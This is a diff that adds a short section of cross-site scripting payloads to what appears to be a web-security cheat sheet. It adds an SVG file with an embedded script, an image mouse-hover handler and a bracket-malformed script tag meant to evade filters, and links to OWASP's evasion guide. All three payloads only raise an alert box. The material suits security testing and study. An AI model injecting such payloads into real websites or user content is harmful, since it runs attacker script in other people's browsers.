@@ -72,6 +72,33 @@ fetch('https://example.com/api/data', {
   .catch(error => console.error(error));
 ```
 
+### Stored XSS [SVG / XML]
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/200/svg">
+   <polygon id="triangle" points="10,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert('UwU');
+   </script>
+</svg>
+```
+> XSS On Mouse Hover Event
+```js
+<IMG SRC=# onmouseover="alert('UwU')">
+```
+> Extraneus Open Brackets
+```js
+<<SCRIPT>alert("UwU");//\<</SCRIPT>
+```
+
+
+# Docs
+- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+
+
+
 \
 \
 \
